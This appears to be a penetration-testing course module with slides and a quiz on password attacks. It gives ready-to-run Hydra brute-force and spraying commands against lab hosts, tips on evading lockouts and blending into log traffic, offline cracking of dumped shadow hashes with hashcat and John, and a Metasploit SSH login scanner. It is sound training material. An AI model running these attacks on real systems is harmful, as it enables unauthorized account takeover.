title: Password Attacks: Brute Force & Spraying 🔑
description: Gain access by guessing or cracking credentials.

slides.title: The Human Element 👤
slides.content:
# Why Hack When You Can Log In?

Often, the easiest way in is through a weak or default password.

**Types of Password Attacks:**
- **Brute Force**: Try every possible combination (time-consuming, noisy).
- **Dictionary Attack**: Try a list of common passwords (e.g., `rockyou.txt`).
- **Password Spraying**: Try ONE common password (e.g., `Winter2024!`) against MANY usernames. **Low and slow, evades lockouts.**
- **Credential Stuffing**: Use leaked username/password pairs from other breaches.

**Targets**: SSH (22), FTP (21), SMB (445), RDP (3389), Web Login Forms.

slides.title: Hydra: The Brute Force King 👑
slides.content:
# Parallelized Login Cracker

**Hydra** is a fast, flexible online password attack tool supporting dozens of protocols.

**Basic Syntax:**
```bash
hydra -l [username] -P [password_list] [target] [protocol]
```

**Examples:**
```bash
# SSH: Try passwords against user 'msfadmin'
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 ssh

# FTP: Try users from list and passwords from list
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 ftp

# Web Form (POST request)
hydra -l admin -P wordlist.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

quizData.question: In Hydra, what does the `-L` flag specify?

options.text: A file containing a list of usernames.
A file containing a list of passwords.

quizData.explanation: `-L` (uppercase) is for a file of usernames; `-l` (lowercase) is for a single username.

slides.title: Password Spraying with Hydra 🚿
slides.content:
# Avoiding Account Lockouts

Instead of trying 1000 passwords on 1 account (triggers lockout), try **1 password on 1000 accounts**.

**Command:**
```bash
hydra -L users.txt -p 'Winter2024!' 192.168.56.101 ssh
```
- `-p` (lowercase) specifies a single password.
- Hydra will attempt `Winter2024!` for every user in `users.txt`.

**Best Practice**: Wait 30-60 minutes between sprays to blend in with normal authentication traffic.

slides.title: Offline Password Cracking: Hashcat 🔐
slides.content:
# When You Have the Hash File

If you've gained access to a system and dumped the password hashes (`/etc/shadow` or Windows SAM), you don't need to guess online. You crack them **offline**.

**Tool**: **Hashcat** (GPU-accelerated) or **John the Ripper** (CPU).

**Basic Hashcat Command:**
```bash
hashcat -m [mode] -a 0 [hash_file] [wordlist]
```

**Common Modes:**
- `0` : MD5
- `1000` : NTLM (Windows)
- `1800` : sha512crypt (Linux /etc/shadow)

**Example (Linux Shadow):**
```bash
# Combine passwd and shadow
unshadow passwd.txt shadow.txt > combined.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
```

slides.title: Online Brute Force Danger ⚠️
slides.content:
## You Will Be Detected

Hydra generates a massive number of login attempts. This **will** fill logs and likely trigger alerts. In a real test:
- Get **explicit permission** for password attacks.
- Use **small, targeted wordlists**.
- Use **throttling** (`-t 4` to reduce threads).

slides.title: Pro Tip: Metasploit Scanners 🚀
slides.content:
## Auxiliary Modules for Brute Force

Metasploit has auxiliary modules for password attacks that integrate nicely with sessions.

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.56.101
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME msfadmin
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

If it succeeds, it automatically creates a Metasploit session!
